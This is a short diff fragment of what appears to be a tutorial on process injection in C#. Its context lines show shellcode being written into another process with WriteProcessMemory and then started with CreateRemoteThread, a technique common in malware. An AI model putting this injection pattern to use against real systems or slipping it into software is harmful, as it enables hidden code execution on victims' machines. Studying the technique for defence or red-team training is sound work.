@@ -292,7 +292,6 @@ We make two small updates to the C# code. First, import the function:
 
 Then call it, providing the thread entrypoint of the address of the shellcode:
 ```csharp
-    ...
     ret = WriteProcessMemory(hProcess, WriteAddress, Shellcode, Shellcode.Length, out lpNumberOfBytesWritten);
 
     IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, WriteAddress, IntPtr.Zero, 0, IntPtr.Zero);
